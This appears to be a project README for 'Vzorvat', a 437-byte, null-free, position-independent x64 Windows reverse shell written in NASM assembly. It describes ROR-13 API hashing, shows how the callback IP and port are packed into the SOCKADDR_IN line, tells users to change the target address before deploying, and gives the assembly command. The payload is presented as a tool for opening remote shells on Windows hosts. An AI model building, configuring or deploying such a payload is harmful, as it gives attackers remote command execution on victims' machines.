![logo](https://i.ibb.co/MxLcQSkF/Chat-GPT-Image-Apr-15-2025-12-35-16-AM.png)
# 'Vzorvat' - x64 Windows Reverse Shell

A position-independent, null-free x64 reverse shell payload for Windows systems, written in assembly (437 Bytes & NASM Syntax).

## Overview

'Vzorvat' is a lightweight assembly-based reverse shell that creates a TCP connection, then spawns CMD with redirected standard I/O.  
It uses a custom API hashing technique to dynamically resolve Windows API functions; it handles ASLR gracefully.

## Features

- **Position Independent Code (PIC)**
- **Null-free**
- **API Resolution via ROR-13 Algo**
- **Small Footprint**: Minimal code size for efficient delivery

## Technical Details

### Connection Configuration

The socket connection is configured in the SOCKADDR_IN structure:
```assembly
mov r12, 0x0100007f611e0002 ; Format: sin_family, sin_port, sin_addr
```

Default configuration connects to 127.0.0.1 (localhost) on port 7777 (0x1e61).
Before deploying, modify the target address in the payload.

The IP and port are encoded as:
- Format: `[2 bytes: AF_INET][2 bytes: PORT][4 bytes: IPv4]`
- Example: `0x0100007f611e0002` *= AF_INET(2) + Port 7777 (0x1e61) + IP 127.0.0.1 (0x0100007f)*

### Assembling the Payload

```bash
nasm -f bin -o vzorvat.bin vzorvat.asm
```
